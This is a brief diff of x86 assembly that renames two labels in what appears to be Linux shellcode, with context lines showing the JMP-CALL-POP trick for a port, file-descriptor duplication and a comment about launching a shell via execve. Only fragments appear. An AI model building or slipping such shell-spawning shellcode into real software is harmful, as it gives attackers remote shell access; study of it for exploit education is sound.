@@ -67,7 +67,7 @@ _start:
 
 
 
-getsome:
+jump_short:
 
 
 	; JMP CALL POP technique for port should do nicely
@@ -181,7 +181,7 @@ change_fd:
 	inc ecx			; 2 (std error) in cl
 	int 0x80		; call it
 
-shell_time:
+shell_exec:
 
 	; now it's time to launch our shell
 	; program using execve. I prefer
